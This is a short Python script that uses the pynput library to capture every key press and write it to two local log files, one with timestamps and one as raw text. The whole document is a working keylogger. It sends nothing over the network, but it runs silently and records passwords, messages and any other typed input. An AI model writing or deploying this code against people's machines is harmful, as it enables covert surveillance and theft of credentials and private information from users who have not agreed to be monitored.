import logging
import os
from pynput.keyboard import Listener

log_Directory = os.getcwd() + '/'
print(os.getcwd())
logging.basicConfig(filename=(log_Directory + "key_log.txt"),
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(key)
    with open('my_log.txt', 'a+') as f:
        f.write(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
